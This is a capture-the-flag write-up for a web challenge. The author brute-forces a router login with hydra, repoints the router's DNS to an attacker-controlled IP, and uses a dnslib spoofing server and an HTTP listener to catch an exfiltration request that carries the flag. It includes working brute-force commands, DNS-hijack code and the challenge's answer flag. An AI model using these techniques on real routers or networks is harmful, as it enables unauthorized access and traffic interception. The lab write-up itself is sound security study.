# Challenge Name: r00t3r

![date](https://img.shields.io/badge/date-18.12.2024-brightgreen.svg)  
![category](https://img.shields.io/badge/category-WEB-blueviolet.svg)  
![Difficulty](https://img.shields.io/badge/Difficulty-Hard-blue.svg)  
![value](https://img.shields.io/badge/value-X-blue.svg)  

## Description

There's a dodgy user on the network exfiltrating data somehow, try and find where they're sending the data and what they're sending.

Author: [BuildHackSecure](https://x.com/BuildHackSecure)

## Detailed solution

Start the challenge server and check the page https://uoa80ug0wea1.ctfhub.io/

We got a redirection to `/login`. It's a login page : https://uoa80ug0wea1.ctfhub.io/login


<img width="2559" height="1529" alt="Pasted image 20251218212808" src="https://github.com/user-attachments/assets/d60a4b41-bd8a-4ae0-838c-496f727658b2" />


As the challenge mentioned router, I checked default credentials from routersploit lists using hydra

```
hydra -l admin -P routersploit/routersploit/resources/wordlists/passwords.txt uoa80ug0wea1.ctfhub.io https-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials provided"
```

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-18 02:27:16
[DATA] max 16 tasks per 1 server, overall 16 tasks, 716 login tries (l:1/p:716), ~45 tries per task
[DATA] attacking http-post-forms://0u2fat8b0mc3.ctfhub.io:443/login:username=^USER^&password=^PASS^:F=Invalid credentials provided
[443][http-post-form] host: 0u2fat8b0mc3.ctfhub.io   login: admin   password: password
```

We got a hit with `admin:password`

Now we have access to the main dashboard


<img width="2559" height="1524" alt="Pasted image 20251218212942" src="https://github.com/user-attachments/assets/fefb8697-9df3-4a21-93ed-0d651d29e64c" />


All tabs have static content except `/dns` which contains an active DNS update feature 


<img width="2557" height="1528" alt="Pasted image 20251218212957" src="https://github.com/user-attachments/assets/41577b1e-dc3a-4391-b704-ecb056f65b69" />


```html
    <div class="card-body dns-form">
        <form method="post" action="/dns">
            <div class="mb-3">
                <label for="dns" class="form-label">IPv4 address</label>
                <input type="text" class="form-control" id="dns" name="dns" value="8.8.8.8" required pattern="^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$">
                <div class="form-text">Example: 1.1.1.1</div>
            </div>
            <button type="submit" class="btn btn-primary">Save DNS Server</button>
            <span class="text-muted small ms-3">Changes apply immediately</span>
        </form>
    </div>
```

I updated the DNS with my IP address 

```http
POST /dns HTTP/1.1
Host: uoa80ug0wea1.ctfhub.io
Cookie: PHPSESSID=b97a56e8f75e01f7beaaed6585e15133
Content-Length: 18
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="143", "Not A(Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Origin: https://uoa80ug0wea1.ctfhub.io
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://uoa80ug0wea1.ctfhub.io/dns
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive

dns=192.241.156.84
```

I started tcpdump to check for potential DNS requests

```
tcpdump -i any udp port 53 
```

```
tcpdump: data link type LINUX_SLL2
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes
20:03:16.235645 eth0  In  IP 144.126.199.232.50963 > ubuntu-vps.domain: 3384+ A? www.google.com. (32)
20:03:16.301455 eth0  In  IP 144.126.199.232.59458 > ubuntu-vps.domain: 3384+ A? www.google.com. (32)
20:03:16.367278 eth0  In  IP 144.126.199.232.40300 > ubuntu-vps.domain: 3384+ A? www.google.com. (32)
20:03:16.445440 eth0  In  IP 144.126.199.232.51706 > ubuntu-vps.domain: 10363+ A? hackinghub.io. (31)
20:03:16.511549 eth0  In  IP 144.126.199.232.38181 > ubuntu-vps.domain: 10363+ A? hackinghub.io. (31)
20:03:21.516281 eth0  In  IP 144.126.199.232.47886 > ubuntu-vps.domain: 10363+ A? hackinghub.io. (31)
20:03:21.594292 eth0  In  IP 144.126.199.232.37608 > ubuntu-vps.domain: 3986+ A? hackerbox.ctf. (31)
20:03:21.660191 eth0  In  IP 144.126.199.232.36859 > ubuntu-vps.domain: 3986+ A? hackerbox.ctf. (31)
20:03:21.726071 eth0  In  IP 144.126.199.232.41245 > ubuntu-vps.domain: 3986+ A? hackerbox.ctf. (31)
```

We got some DNS calls from an IP address 144.126.199.232, asking for A records, which means we controlled the DNS in the system.

By controlling DNS resolution, we can position ourselves as a man-in-the-middle (MITM) and return arbitrary A records, gaining control over HTTP requests.

First script to return a specific IP address for any A records

```python
from dnslib import DNSRecord, RR, A, QTYPE
from dnslib.server import DNSServer

class MyResolver:
    def resolve(self, request, handler):
        reply = request.reply()
        qname = request.q.qname
        qtype = request.q.qtype

        # Return your IP for ALL A record queries
        if qtype == QTYPE.A:
            print(qtype)
            reply.add_answer(RR(qname, QTYPE.A, rdata=A("192.1.1.100"), ttl=300))

        return reply

resolver = MyResolver()
server = DNSServer(resolver, port=53, address="0.0.0.0")
server.start()

```

Output to confirm:

```
python 2.py
2025-12-18 20:11:14 [DNSHandler:MyResolver] Request: [144.126.199.232:35946] (udp) / 'www.google.com.' (A)
1
2025-12-18 20:11:14 [DNSHandler:MyResolver] Reply: [144.126.199.232:35946] (udp) / 'www.google.com.' (A) / RRs: A
2025-12-18 20:11:14 [DNSHandler:MyResolver] Request: [144.126.199.232:56407] (udp) / 'hackinghub.io.' (A)
1
2025-12-18 20:11:14 [DNSHandler:MyResolver] Reply: [144.126.199.232:56407] (udp) / 'hackinghub.io.' (A) / RRs: A
2025-12-18 20:11:15 [DNSHandler:MyResolver] Request: [144.126.199.232:34200] (udp) / 'hackerbox.ctf.' (A)
1
2025-12-18 20:11:15 [DNSHandler:MyResolver] Reply: [144.126.199.232:34200] (udp) / 'hackerbox.ctf.' (A) / RRs: A
2025-12-18 20:11:30 [DNSHandler:MyResolver] Request: [144.126.199.232:59037] (udp) / 'www.google.com.' (A)
```

Now we need a simple HTTP server to collect HTTP requests with headers too (needed after the first test with URL only)

```python
from http.server import BaseHTTPRequestHandler, HTTPServer

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        print("\n=== Incoming Request ===")
        print(f"{self.command} {self.path} {self.request_version}")
        for k, v in self.headers.items():
            print(f"{k}: {v}")

        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK\n")

    def do_POST(self):
        self.do_GET()

if __name__ == "__main__":
    server = HTTPServer(("0.0.0.0", 80), Handler)
    print("Listening on 0.0.0.0:80")
    server.serve_forever()
```

Output: we received HTTP requests to `/exfil` with a header `X-Flag` containing the flag

```
python 3.py
Listening on 0.0.0.0:80

=== Incoming Request ===
GET /exfil HTTP/1.1
Host: hackerbox.ctf
User-Agent: curl/8.14.1
Accept: */*
X-Flag: flag{71626bd7ea0a229213386be8d9915a22}
144.126.199.232 - - [18/Dec/2025 20:18:31] "GET /exfil HTTP/1.1" 200 -

=== Incoming Request ===
GET /exfil HTTP/1.1
Host: hackerbox.ctf
User-Agent: curl/8.14.1
Accept: */*
X-Flag: flag{71626bd7ea0a229213386be8d9915a22}
144.126.199.232 - - [18/Dec/2025 20:18:46] "GET /exfil HTTP/1.1" 200 -
```

## Flag

```
flag{71626bd7ea0a229213386be8d9915a22}
```
